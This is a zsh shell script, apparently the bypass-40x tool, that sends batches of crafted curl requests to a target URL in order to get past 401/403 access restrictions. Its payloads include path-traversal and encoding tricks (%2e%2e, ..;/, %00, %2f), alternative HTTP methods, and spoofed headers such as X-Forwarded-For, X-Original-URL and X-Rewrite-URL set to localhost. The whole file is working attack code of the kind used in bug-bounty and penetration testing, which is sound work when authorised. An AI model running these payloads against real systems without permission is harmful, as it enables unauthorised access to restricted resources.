#! /bin/zsh
figlet Bypass-40x
echo "                               https://github.com/cyal1/bypass-40x"
#Show usage
if [ "$#" -lt 1 ]
then
	echo "./bypass-40x.sh  [OPTIONS]  https://example.com /dir"
	echo "./bypass-40x.sh  [OPTIONS]  https://example.com/dir1/dir2 /dir3/dir4"
	echo "OPTIONS:"
	echo "  -r Allow redirection if response is 3XX"
	exit
fi
# bash neet set RED,GREEN,YELLOW,CLEAR empty
RED="\e[1m\e[31m"
GREEN="\e[1m\e[32m"
YELLOW="\e[1m\e[33m"
CLEAR="\e[0m"

METHOD="-XGET" # default is GET
TIMEOUT=-m"0" # TIMEOUT="-m 2"
COOKIE="" 
# COOKIE="Cookie: a=b"
USER_AGENT=-A"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"

#Check optional arguments
REDIRECT=""
if [[ $(echo $*) == *"-r "* ]]
then
		REDIRECT="-L"
fi

# ./bypass-40x.sh https://example.com/xxx
if [ "$#" -eq 1 ]; then
	URL=$1
	ONLY_URL=1
else
	ONLY_URL=0
fi

# ./bypass-40x.sh https://example.com/xxx/ /dir
if [ "$#" -eq 2 ]; then
	URL=$1
	DIR=$2
fi

# ./bypass-40x.sh  [OPTIONS]  https://example.com/xxx/ /dir
if [ "$#" -eq 3 ]; then
	URL=$2
	DIR=$3
fi

#Check URL starts with http*
echo ${URL} | grep -i ^http > /dev/null
if [ $? -gt 0 ]; then
	echo "Note: Start your url with http:// or https://"
	exit
fi

# strip "/" from the suffix of  URL
if [ $ONLY_URL -ne 1 ]; then
	URL=${URL%/}
fi

# strip "/" from the prefix of DIR
DIR=${DIR#/}

function curl_wapper(){
	curl -k -s -o /dev/null --path-as-is -w "%{http_code}","%{size_download}" -H "$COOKIE" "$USER_AGENT" "$TIMEOUT" $REDIRECT "$METHOD" "$@"
}
# https://www.baidu.com/dir1<payload>
function payload_Suffux(){
	# $1: full url with out "/" suffux
	if [[ x$(echo ${1}|cut -d '/' -f4) != x ]]; then
		# fix https://www.baidu.com<payload>
		output "${1}*" $(curl_wapper "${1}*")
		output "${1};" $(curl_wapper "${1};")
		output "${1}%3f" $(curl_wapper "${1}%3f")
		output "${1}%20" $(curl_wapper "${1}%20")
		output "${1}%F3%A0%81%A9" $(curl_wapper "${1}%F3%A0%81%A9")
		output "${1};/" $(curl_wapper "${1};/")
		output "${1}%2f" $(curl_wapper "${1}%2f")
		output "${1}.json" $(curl_wapper "${1}.json")
		output "${1}%23" $(curl_wapper "${1}%23")
		output "${1}%00" $(curl_wapper "${1}%00")
		output "${1}..;/" $(curl_wapper "${1}..;/")
		output "${1}%" $(curl_wapper "${1}%")
		output "${1}?" $(curl_wapper "${1}? ")
		output "${1}??" $(curl_wapper "${1}??")
		output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\")
		upper_end=${1:0:${#1}-1}$(tr '[:lower:]' '[:upper:]' <<< ${1:${#1}-1:1})
		lower_end=${1:0:${#1}-1}$(tr '[:upper:]' '[:lower:]' <<< ${1:${#1}-1:1})
		output "${upper_end}" $(curl_wapper ${upper_end})
		output "${lower_end}" $(curl_wapper ${lower_end})
	fi

	output "${1}/*" $(curl_wapper "${1}/*")
	output "${1}/;" $(curl_wapper "${1}/;")
	output "${1}/%3f" $(curl_wapper "${1}/%3f")
	output "${1}/%" $(curl_wapper "${1}/%")
	output "${1}/?" $(curl_wapper "${1}/? ")
	output "${1}/%00" $(curl_wapper "${1}/%00")
	output "${1}/??" $(curl_wapper "${1}/??")
	output "${1}/%20" $(curl_wapper "${1}/%20")
	output "${1}/%F3%A0%81%A9" $(curl_wapper "${1}/%F3%A0%81%A9")
	output "${1}/;/" $(curl_wapper "${1}/;/")
	output "${1}/%2f" $(curl_wapper "${1}/%2f")
	output "${1}/.json" $(curl_wapper "${1}/.json")
	output "${1}/%23" $(curl_wapper "${1}/%23")
	output "${1}/..;/" $(curl_wapper "${1}/..;/")

	output "${1}/%09" $(curl_wapper "${1}/%09")
	output "${1}/.%2f" $(curl_wapper "${1}/.%2f")
	output "${1}/%2e" $(curl_wapper "${1}/%2e")
	output "${1}/%2e/" $(curl_wapper "${1}/%2e/")
	output "${1}//" $(curl_wapper "${1}//")
	output "${1}/./" $(curl_wapper "${1}/./")
	output "${1}/../" $(curl_wapper "${1}/../")
	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/")
	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f")

	output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../")
	output "${1}/randomstr/..;/" $(curl_wapper "${1}/randomstr/..;/")
	output "${1}/randomstr/%2e%2e/" $(curl_wapper "${1}/randomstr/%2e%2e/")
	output "${1}/randomstr/%2e%2e%2f" $(curl_wapper "${1}/randomstr/%2e%2e%2f")
}
# https://www.baidu.com/dir1<payload>dir2
function payload_Between(){
	# $1 URL
	# $2 DIR
	if [[ x$(echo ${URL}|cut -d '/' -f4) != x ]]; then
		# fix https://www.baidu.com<payload>dir
		output "${1};/${2}" $(curl_wapper "${1};/${2}")
		output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}")
	fi

	output "${1}/%2e/${2}" $(curl_wapper "${1}/%2e/${2}")
	output "${1}/;${2}" $(curl_wapper "${1}/;${2}")
	output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
	output "${1}/randomstr/..%2f${2}" $(curl_wapper "${1}/randomstr/..%2f${2}")
	output "${1}/randomstr/..;/${2}" $(curl_wapper "${1}/randomstr/..;/${2}")
	output "${1}/randomstr/%2e%2e/${2}" $(curl_wapper "${1}/randomstr/%2e%2e/${2}")
	output "${1}/randomstr/%2e%2e%2f${2}" $(curl_wapper "${1}/randomstr/%2e%2e%2f${2}")
	output "${1}/;/${2}" $(curl_wapper "${1}/;/${2}")
	output "${1}/./${2}" $(curl_wapper "${1}/./${2}")
	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}")
	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}")
	output "${1}//${2}" $(curl_wapper "${1}//${2}")
	upper_start=${1}/$(tr '[:lower:]' '[:upper:]' <<< ${2:0:1})${2:1}
	lower_start=${1}/$(tr '[:upper:]' '[:lower:]' <<< ${2:0:1})${2:1}
	output "${upper_start}" $(curl_wapper "${upper_start}")
	output "${lower_start}" $(curl_wapper "${lower_start}")
}
# https://www.baidu.com/dir1<payload>dir2<payload>
function payload_Both(){
	:
}

function payload_Header(){
	FULL_URL=$1
	fqdn_url=${FULL_URL%%//*}//$(echo ${FULL_URL}|cut -d'/' -f 3)/
	tmp=${FULL_URL#*//}
	rewrite_url=${tmp#*/}
	# https://www.baidu.com/a/b/c/d
	# $1(FULL_URL): https://www.baidu.com/a/b/c/d
	# fqdn_url: https://www.baidu.com/
	# rewrite_url: a/b/c/d
	if [[ x$(echo ${FULL_URL}|cut -d '/' -f4) != x ]]; then
		# fix https://www.baidu.com..;/
		output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
	fi
	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL)
	output "X-Forward-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forward-For: http://127.0.0.1" $FULL_URL)
	output "X-Forwarded-For: 127.0.0.1:80 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1:80" $FULL_URL)
	output "X-Original-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Original-URL: /$rewrite_url" "${fqdn_url}anything")
	output "X-Rewrite-URL: /$rewrite_url \t $fqdn_url"  $(curl_wapper -H "X-Rewrite-URL: /$rewrite_url" "${fqdn_url}anything")
	output "X-Forwarded-For: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1" $FULL_URL)
	output "X-Originating-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Originating-IP: 127.0.0.1" $FULL_URL)
	output "X-Remote-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-IP: 127.0.0.1" $FULL_URL)
	output "X-Remote-Addr: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Remote-Addr: 127.0.0.1" $FULL_URL)
	output "X-Client-IP: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Client-IP: 127.0.0.1" $FULL_URL)
	output "X-Forwarded-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-Host: 127.0.0.1" $FULL_URL)
	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL)
	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL)
	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL)
	output "too many header one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
													-H "Request-Uri: /$rewrite_url" \
													-H "X-Forwarded: 127.0.0.1" \
													-H "X-Forwarded-By: 127.0.0.1" \
													-H "X-Forwarded-For-Original: 127.0.0.1" \
													-H "X-Forwarded-Server: 127.0.0.1" \
													-H "X-Forwarder-For: 127.0.0.1" \
													-H "X-Forward-For: 127.0.0.1" \
													-H "Base-Url: http://127.0.0.1/$rewrite_url" \
													-H "Http-Url: http://127.0.0.1/$rewrite_url" \
													-H "Proxy-Url: http://127.0.0.1/$rewrite_url" \
													-H "Redirect: http://127.0.0.1/$rewrite_url" \
													-H "Real-Ip: 127.0.0.1" \
													-H "Referer: http://127.0.0.1/$rewrite_url" \
													-H "Referrer: http://127.0.0.1/$rewrite_url" \
													-H "Refferer: http://127.0.0.1/$rewrite_url" \
													-H "Uri: /$rewrite_url" \
													-H "Url: http://127.0.0.1/$rewrite_url" \
													-H "X-Http-Destinationurl: 127.0.0.1" \
													-H "X-Http-Host-Override: 127.0.0.1" \
													-H "X-Original-Remote-Addr: 127.0.0.1" \
													-H "X-Proxy-Url: http://127.0.0.1/$rewrite_url" \
													-H "X-Real-Ip: 127.0.0.1" \
													$FULL_URL)
}

function output(){
	# $1 output url
	# $2 status & content-length
	STATUS=$(echo $2|cut -d',' -f 1)
	LENGTH=$(echo $2|cut -d',' -f 2)
	if [[ ${STATUS} =~ 2.. ]]; then
		echo -e "${GREEN}${2}${CLEAR} \t=> $1"
	elif [[ ${STATUS} =~ 3.. ]]; then
		echo -e "${YELLOW}${2}${CLEAR} \t=> $1"
	else
		echo -e "${RED}${2}${CLEAR} \t=> $1"
	fi
}

FULL_URL="${URL}/${DIR}"

if [ $ONLY_URL -eq 1 ]; then
	FULL_URL="${URL}"
fi
######################## ip versoin ######################### 
echo -e "\n${GREEN}[+] IP Version...${CLEAR}"
output "curl --ipv4 $FULL_URL"  $(curl_wapper -4 $FULL_URL) &
output "curl --ipv6 $FULL_URL"  $(curl_wapper -6 $FULL_URL) &
wait
####################### HTTP Methods ######################## 
echo -e "\n${GREEN}[+] HTTP Methods...${CLEAR}"
#DELETE disabled by default, too dangerous
for Verb in {"OPTIONS","HEAD","PUT","POST","TRACE","TRACK","PATCH","MOVE","CONNECT"}
do
	if [[ $Verb == "POST" ]]; then
		output "$Verb \t $FULL_URL" $(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL) &
	elif [[  $Verb == "HEAD"  ]]; then
		output "$Verb \t $FULL_URL" $(curl_wapper -m 1 -X HEAD $FULL_URL) & # timeout=1
	else
		output "$Verb \t $FULL_URL" $(curl_wapper -X $Verb $FULL_URL) &
	fi
done
wait
###################### Bugbountytips ##########################
echo -e "\n${GREEN}[+] Bugbountytips 40x bypass methods...${CLEAR}"
FULL_URL_1="${URL}/${DIR%/}"
if [ $ONLY_URL -eq 1 ]; then 
	FULL_URL_1="${URL%/}" 
fi
payload_Suffux $FULL_URL_1

if [ $ONLY_URL -ne 1 ]; then
	payload_Between ${URL} ${DIR}
	payload_Both ${URL} ${DIR}
fi

########################## HEADERS #############################
echo -e "\n${GREEN}[+] HEADERS...${CLEAR}"
payload_Header $FULL_URL
